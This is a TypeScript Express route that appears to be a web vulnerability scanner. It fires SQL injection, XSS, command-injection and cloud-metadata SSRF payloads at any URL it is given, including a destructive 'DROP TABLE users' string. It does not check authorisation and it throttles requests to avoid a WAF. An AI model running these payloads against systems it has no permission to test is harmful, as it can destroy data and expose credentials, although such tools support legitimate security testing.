import { Router } from "express";
import axios from "axios";

const router = Router();

// Payloads for different vulnerabilities
const PAYLOADS = {
  sqli: ["' OR 1=1 --", "'; DROP TABLE users; --", "\" OR \"1\"=\"1"],
  xss: [`<script>alert('XSS')</script>`, `"><svg/onload=alert(1)>`],
  rce: [";ls", "&& whoami", "| id"],
  ssrf: ["http://169.254.169.254/latest/meta-data/"],
};

async function testPayload(url: string, param: string, payload: string) {
  try {
    const testUrl = new URL(url);
    testUrl.searchParams.set(param, payload);

    const response = await axios.get(testUrl.toString(), {
      timeout: 6000,
      validateStatus: () => true, // allow 4xx and 5xx responses
    });

    const bodySample =
      typeof response.data === "string"
        ? response.data.slice(0, 300)
        : JSON.stringify(response.data).slice(0, 300);

    return {
      payload,
      status: response.status,
      bodySample,
    };
  } catch (err: any) {
    return {
      payload,
      error: err.message || "Request failed",
    };
  }
}

router.post("/", async (req, res) => {
  const { url, tests = ["sqli", "xss", "rce", "ssrf"] } = req.body;

  if (!url) return res.status(400).json({ error: "Target URL required" });

  try {
    const results: any = {};

    // Extract query params from URL
    const urlObj = new URL(url);
    const params = Array.from(urlObj.searchParams.keys());

    if (params.length === 0) {
      return res.status(400).json({
        error: "No query params found. Provide a URL with params for testing.",
      });
    }

    for (const type of tests) {
      results[type] = [];

      for (const param of params) {
        let count = 0;

        for (const payload of PAYLOADS[type] || []) {
          // Stop early if too many tests per param (avoid WAF)
          if (count >= 3) break;

          const outcome = await testPayload(url, param, payload);

          results[type].push({
            param,
            payload,
            status: outcome.status || "Request failed",
            vulnerable:
              outcome.bodySample?.includes(payload) ||
              outcome.status === 500 ||
              /error|syntax|unexpected/i.test(outcome.bodySample || ""),
          });

          count++;
          await new Promise((r) => setTimeout(r, 300)); // polite delay
        }
      }
    }

    res.json({ success: true, target: url, results });
  } catch (e: any) {
    console.error("vulnFuzzer error:", e.message);
    res.status(500).json({ error: "Fuzzer failed", details: e.message });
  }
});

export default router;
